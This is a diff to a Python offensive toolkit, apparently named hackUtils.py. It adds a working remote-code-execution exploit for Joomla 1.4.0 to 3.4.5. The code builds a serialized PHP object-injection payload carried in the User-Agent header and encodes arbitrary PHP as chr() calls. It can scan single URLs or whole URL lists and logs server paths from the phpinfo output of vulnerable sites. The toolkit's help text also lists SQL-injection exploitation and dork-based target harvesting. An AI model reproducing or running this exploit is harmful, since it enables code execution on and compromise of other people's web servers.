@@ -383,7 +383,83 @@ def getInfoByJoomlaSQLi(url, param):
 	   info=match_url.group(1)
         return info
     except Exception,e:
-        return 'no info!'    
+        return 'no info!'
+
+def rceJoomla(value):
+    now = time.strftime('%H:%M:%S',time.localtime(time.time()))
+    print "["+str(now)+"] [INFO] Checking Joomla 1.4.0 - 3.4.5 Remote Command Execute..."
+    if 'http://' in value or 'https://' in value:
+    	url=value
+    	checkJoomlaRCE(url)
+    else:
+    	urlfile=open(value,'r')
+    	for url in urlfile:
+            if url.strip():
+                checkJoomlaRCE(url)
+    	urlfile.close()
+    output = os.path.dirname(os.path.realpath(__file__))+"/joomla_rce.txt"
+    if os.path.exists(output):
+        print "\n[INFO] Scanned Vuls:"
+        print "[*] Output File: "+output
+
+def checkJoomlaRCE(url):    
+    url = url.strip()
+    poc = generate_payload("phpinfo();")
+    try:
+        result = get_url(url, poc)
+        
+        if 'phpinfo()' in result:
+            system = getInfoByJoomlaRCE(result, 'System')
+            document_root = getInfoByJoomlaRCE(result, 'DOCUMENT_ROOT')
+            script_filename = getInfoByJoomlaRCE(result, 'SCRIPT_FILENAME')
+            vuls='[+] vuls found! url: '+url+', System: '+system+', DOCUMENT_ROOT: '+document_root+', SCRIPT_FILENAME: '+script_filename
+            logfile(vuls,'joomla_rce.txt')
+            print vuls
+        else:
+            print '[!] no vuls! url: '+url
+    except Exception,e:
+        print '[!] connection failed! url: '+url
+
+def get_url(url, user_agent): 
+    headers = {
+    'User-Agent': user_agent
+    }
+    cookies = requests.get(url,headers=headers).cookies
+    for _ in range(3):
+        response = requests.get(url, headers=headers,cookies=cookies)    
+    return response.content
+   
+def php_str_noquotes(data):
+    "Convert string to chr(xx).chr(xx) for use in php"
+    encoded = ""
+    for char in data:
+        encoded += "chr({0}).".format(ord(char))
+    return encoded[:-1]
+ 
+def generate_payload(php_payload):
+    php_payload = "eval({0})".format(php_str_noquotes(php_payload))
+
+    terminate = '\xf0\xfd\xfd\xfd';
+    exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
+    injected_payload = "{};JFactory::getConfig();exit".format(php_payload)    
+    exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
+    exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
+
+    return exploit_template
+
+def getInfoByJoomlaRCE(result, param):
+    if "System" in param:
+        reg = '.*<tr><td class="e">System </td><td class="v">([^<>]*?)</td></tr>.*'
+    elif "DOCUMENT_ROOT" in param:	
+        reg = '.*<tr><td class="e">DOCUMENT_ROOT </td><td class="v">([^<>]*?)</td></tr>.*'
+    elif "SCRIPT_FILENAME" in param:
+        reg = '.*<tr><td class="e">SCRIPT_FILENAME </td><td class="v">([^<>]*?)</td></tr>.*'
+    match_url = re.search(reg,result)
+    if match_url:
+       info=match_url.group(1)
+    else:
+        info = 'no info!'
+    return info
     
 def myhelp():
     print "\n+-----------------------------+"
@@ -398,6 +474,7 @@ def myhelp():
     print "  -g keyword, --google=keyword                        Fetch URLs from Google based on specific keyword"
     print "  -w keyword, --wooyun=keyword                        Fetch URLs from Wooyun Corps based on specific keyword"
     print "  -j url|file, --joomla=url|file                      Exploit SQLi for Joomla 3.2 - 3.4"
+    print "  -r url|file, --rce=url|file                         Exploit Remote Command Execute for Joomla 1.4.0 - 3.4.5"
     print "  -d site, --domain=site                              Scan subdomains based on specific site"
     print "  -e string, --encrypt=string                         Encrypt string based on specific encryption algorithms (e.g. base64, md5, sha1, sha256, etc.)"
     print "\nExamples:"
@@ -406,13 +483,15 @@ def myhelp():
     print "  hackUtils.py -w .php?id="
     print "  hackUtils.py -j http://www.joomla.com/"
     print "  hackUtils.py -j urls.txt"
+    print "  hackUtils.py -r http://www.joomla.com/"
+    print "  hackUtils.py -r urls.txt"
     print "  hackUtils.py -d example.com"
     print "  hackUtils.py -e text"
     print "\n[!] to see help message of options run with '-h'"
 
 def main():
     try:
-        options,args = getopt.getopt(sys.argv[1:],"hb:g:w:j:d:e:",["help","baidu=","google=","wooyun=","joomla=","domain=","encrypt="])
+        options,args = getopt.getopt(sys.argv[1:],"hb:g:w:j:r:d:e:",["help","baidu=","google=","wooyun=","joomla=","rce=","domain=","encrypt="])
     except getopt.GetoptError:
         print "\n[WARNING] error, to see help message of options run with '-h'"
         sys.exit()
@@ -428,6 +507,8 @@ def main():
             fetchUrls('wooyun',value,50)
         if name in ("-j","--joomla"):
             checkJoomla(value)
+        if name in ("-r","--rce"):
+            rceJoomla(value)
         if name in ("-d","--domain"):
             scanSubDomains('baidu',value,50)
         if name in ("-e","--encrypt"):
